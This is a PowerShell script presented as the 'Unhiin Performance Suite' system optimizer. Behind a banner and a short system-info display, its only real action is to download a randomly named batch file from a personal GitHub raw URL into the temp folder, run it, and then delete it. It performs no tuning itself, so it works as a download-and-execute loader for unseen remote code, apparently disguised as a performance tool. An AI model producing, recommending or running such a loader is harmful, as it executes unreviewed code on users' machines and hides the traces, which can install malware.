# Unhiin Optimizer  
<#  
.SYNOPSIS  
    Performance Suite Launcher  
.DESCRIPTION  
    Downloads and executes Unhiin Performance Suite  
#>  

# Console settings  
$Host.UI.RawUI.WindowTitle = "Unhiin Performance Suite"  

# Disable default progress  
$ProgressPreference = "SilentlyContinue"  

function Show-Banner {  
    $banner = @"  
╔═══════════════════════════════════════════════════════════════╗
║                                                               ║
║     ██╗   ██╗███╗   ██╗██╗  ██╗██╗███╗   ██╗                 ║
║     ██║   ██║████╗  ██║██║  ██║██║████╗  ██║                 ║
║     ██║   ██║██╔██╗ ██║███████║██║██╔██╗ ██║                 ║
║     ██║   ██║██║╚██╗██║██╔══██║██║██║╚██╗██║                 ║
║     ╚██████╔╝██║ ╚████║██║  ██║██║██║ ╚████║                 ║
║      ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝                 ║
║                                                               ║
║               P E R F O R M A N C E   S U I T E               ║
║               System Optimization & Tuning                    ║
║               Version 4.2 - Performance Edition               ║
║                                                               ║
╚═══════════════════════════════════════════════════════════════╝
"@  
    Write-Host $banner -ForegroundColor Cyan
}  

function Download-Suite {  
    param([string]$Url, [string]$OutputPath)  
      
    Write-Host "`n[ DOWNLOADING PERFORMANCE SUITE ]" -ForegroundColor Yellow
    Write-Host "═══════════════════════════════════════════════════"
      
    try {  
        Invoke-WebRequest -Uri $Url -OutFile $OutputPath -UseBasicParsing
        Write-Host "✓ Download complete" -ForegroundColor Green
        return $true  
    } catch {  
        Write-Host "✗ Download failed: $($_.Exception.Message)" -ForegroundColor Red
        return $false  
    }  
}  

function Execute-Suite {  
    param([string]$BatchPath)  
      
    Write-Host "`n[ EXECUTING PERFORMANCE SUITE ]" -ForegroundColor Yellow
    Write-Host "═══════════════════════════════════════════════════"
      
    try {  
        $process = Start-Process -FilePath $BatchPath -Wait -NoNewWindow -PassThru  
          
        if ($process.ExitCode -eq 0) {  
            Write-Host "`n✓ Optimization successful" -ForegroundColor Green
            return $true  
        } else {  
            Write-Host "`n⚠ Optimization completed with code: $($process.ExitCode)" -ForegroundColor Yellow
            return $true  
        }  
    } catch {  
        Write-Host "`n✗ Execution failed: $($_.Exception.Message)" -ForegroundColor Red
        return $false  
    }  
}  

function Cleanup-Files {  
    param([string]$FilePath)  
      
    Write-Host "`n[ CLEANING UP ]" -ForegroundColor Yellow
    Write-Host "═══════════════════════════════════════════════════"
      
    try {  
        Remove-Item -Path $FilePath -Force -ErrorAction SilentlyContinue
        Write-Host "✓ Cleanup complete" -ForegroundColor Green
    } catch {  
        Write-Host "⚠ Cleanup warning: $($_.Exception.Message)" -ForegroundColor Yellow
    }  
}  

# Main function  
function Main {  
    Clear-Host  
    Show-Banner  
      
    # GitHub Raw URL for Unhiin Performance Suite
    $suiteUrl = "https://raw.githubusercontent.com/hypnotixx0/mrbatch/main/unhiin_4K3LjceVQwjN.bat"
    $tempPath = Join-Path $env:TEMP "unhiin_suite.bat"  
    
    Write-Host "`n[ SYSTEM INFORMATION ]" -ForegroundColor Yellow
    Write-Host "═══════════════════════════════════════════════════"
    Write-Host "OS Version: $([System.Environment]::OSVersion.VersionString)"
    Write-Host "System Drive: $env:SystemDrive"
    Write-Host "Available RAM: $([math]::Round((Get-CimInstance Win32_OperatingSystem).FreePhysicalMemory / 1MB, 2)) GB"
    
    Write-Host "`n[ INITIALIZING ]" -ForegroundColor Yellow
    Write-Host "═══════════════════════════════════════════════════"
    Write-Host "Launching Unhiin Performance Suite v4.2..."
    
    $downloadSuccess = Download-Suite -Url $suiteUrl -OutputPath $tempPath  
      
    if (-not $downloadSuccess) {  
        Write-Host "`n✗ Process failed during download." -ForegroundColor Red
        Write-Host "`nPress Enter to exit..."
        Read-Host  
        exit 1  
    }  
      
    $executionSuccess = Execute-Suite -BatchPath $tempPath  
      
    if (-not $executionSuccess) {  
        Write-Host "`n✗ Process failed during execution." -ForegroundColor Red
        Cleanup-Files -FilePath $tempPath  
        Write-Host "`nPress Enter to exit..."
        Read-Host  
        exit 1  
    }  
      
    Cleanup-Files -FilePath $tempPath  
      
    Write-Host "`n═══════════════════════════════════════════════════"
    Write-Host "Unhiin Performance Suite Execution Complete" -ForegroundColor Cyan
    Write-Host "Timestamp: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
    Write-Host "═══════════════════════════════════════════════════"
      
    Write-Host "`nPress Enter to exit..."
    Read-Host  
}  

# Error trap  
trap {  
    Write-Host "`n✗ Critical error occurred" -ForegroundColor Red
    Write-Host "═══════════════════════════════════════════════════"
    Write-Host "Details: $($_.Exception.Message)"
    Write-Host "Line: $($_.InvocationInfo.ScriptLineNumber)"
    Write-Host "═══════════════════════════════════════════════════"
    Write-Host "`nPress Enter to exit..."
    Read-Host  
    exit 1  
}  

Main  
